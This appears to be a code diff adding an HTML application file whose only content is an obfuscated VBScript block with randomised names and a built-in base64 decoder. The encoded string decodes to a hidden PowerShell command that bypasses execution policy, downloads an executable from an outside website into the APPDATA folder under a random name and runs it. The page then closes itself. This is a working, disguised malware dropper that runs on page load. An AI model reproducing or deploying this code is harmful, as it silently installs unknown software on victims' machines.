@@ -1,0 +1,69 @@
+    <html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+    <script language="VBScript">
+        Function lDQhFajyiiiobZ(ByVal eJjiCQYs)
+            Const JMSZHGYsdhTpcE = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+            Dim UqQTyXQHSyhcjg
+            Dim kNycfXDFuDrwWly
+            Dim DqPXQoAz
+            
+            eJjiCQYs = Replace(eJjiCQYs, vbCrLf, "")
+            eJjiCQYs = Replace(eJjiCQYs, vbTab, "")
+            eJjiCQYs = Replace(eJjiCQYs, " ", "")
+            
+            UqQTyXQHSyhcjg = Len(eJjiCQYs)
+
+            For DqPXQoAz = 1 To UqQTyXQHSyhcjg Step 4
+              Dim RoLiUjQcaia
+              Dim iczgTZdwIcRhGP
+              Dim uxfzmQE
+              Dim EBtfn
+              Dim uABJGvOmLtIm
+              Dim iqYJYU
+
+              RoLiUjQcaia = 3
+              uABJGvOmLtIm = 0
+
+              For iczgTZdwIcRhGP = 0 To 3
+
+                uxfzmQE = Mid(eJjiCQYs, DqPXQoAz + iczgTZdwIcRhGP, 1)
+
+                If uxfzmQE = "=" Then
+                  RoLiUjQcaia = RoLiUjQcaia - 1
+                  EBtfn = 0
+                Else
+                  EBtfn = InStr(1, JMSZHGYsdhTpcE, uxfzmQE, vbBinaryCompare) - 1
+                End If
+
+                uABJGvOmLtIm = 64 * uABJGvOmLtIm + EBtfn
+              Next
+              
+              uABJGvOmLtIm = Hex(uABJGvOmLtIm)
+              uABJGvOmLtIm = String(6 - Len(uABJGvOmLtIm), "0") & uABJGvOmLtIm
+              
+              iqYJYU = Chr(CByte("&H" & Mid(uABJGvOmLtIm, 1, 2))) + _
+                Chr(CByte("&H" & Mid(uABJGvOmLtIm, 3, 2))) + _
+                Chr(CByte("&H" & Mid(uABJGvOmLtIm, 5, 2)))
+
+              kNycfXDFuDrwWly = kNycfXDFuDrwWly & Left(iqYJYU, RoLiUjQcaia)
+            Next
+
+            lDQhFajyiiiobZ = kNycfXDFuDrwWly
+          End Function
+
+    Dim iynef
+    Dim OPjOKDk
+    Dim mBRdiA
+    iynef = "cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBieXBhc3MgLVdpbmRvd1N0eWxlIGhpZGRlbiAtbm9sb2dvICRxeEtqek1sWCA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbiB8IFNlbGVjdCAtRXhwYW5kIE1ham9yOyRCc0FyS1lYcmFDZyA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbiB8IFNlbGVjdCAtRXhwYW5kIE1pbm9yOyRyU3NFT3ZYUSA9ICIkcXhLanpNbFgiICsgJy4nICsgIiRCc0FyS1lYcmFDZyI7JGRLQ1VOVFlDID0gJFBTVmVyc2lvblRhYmxlLlBTVmVyc2lvbi5NYWpvcjtpZigkZEtDVU5UWUMgLWVxIDIpeyRWQXN0YSA9IEdldC1SYW5kb20gLU1pbmltdW0gNSAtTWF4aW11bSAxMDskRElNeEVOdHpvID0gLWpvaW4gKCg2NS4uOTApICsgKDk3Li4xMjIpIHwgR2V0LVJhbmRvbSAtQ291bnQgJFZBc3RhIHwgJSB7W2NoYXJdJF99KTskQm1ySUR1VXEgPSAkRElNeEVOdHpvICsgJy5leGUnOyRUVGZDQ1J3ID0gIiRlbnY6QVBQREFUQSIgKyAnXCcgKyAiJEJtcklEdVVxIjs7Ozs7JE92akdQdCA9ICdodHRwOi8vd3d3LmhxZnJlZXBpY3Mud2Vic2l0ZS9kYXJrLmV4ZSc7JElCUUVmWVdWbVJnc1F3WSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHBPeVN2anVWcW9pYXBaID0gJElCUUVmWVdWbVJnc1F3WS5Eb3dubG9hZEZpbGUoJE92akdQdCwgJFRUZkNDUncpfWVsc2VpZigkZEtDVU5UWUMgLWdlIDMpeyRWQXN0YSA9IEdldC1SYW5kb20gLU1pbmltdW0gNSAtTWF4aW11bSAxMDskRElNeEVOdHpvID0gLWpvaW4gKCg2NS4uOTApICsgKDk3Li4xMjIpIHwgR2V0LVJhbmRvbSAtQ291bnQgJFZBc3RhIHwgJSB7W2NoYXJdJF99KTskQm1ySUR1VXEgPSAkRElNeEVOdHpvICsgJy5leGUnOyRUVGZDQ1J3ID0gIiRlbnY6QVBQREFUQSIgKyAnXCcgKyAiJEJtcklEdVVxIjs7Ozs7JE92akdQdCA9ICdodHRwOi8vd3d3LmhxZnJlZXBpY3Mud2Vic2l0ZS9kYXJrLmV4ZSc7SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkT3ZqR1B0IC1PdXRGaWxlICRUVGZDQ1J3fTtTdGFydC1Qcm9jZXNzICRUVGZDQ1J3OzsiIg=="
+    OPjOKDk = lDQhFajyiiiobZ(iynef)
+    set mBRdiA = CreateObject("Wscript.Shell")
+    mBRdiA.Run(OPjOKDk),0,true
+    self.close()
+    </script>
+    </head>
+    <div> 
+    </div>   
+    <body>
+    </body>
+    </html>
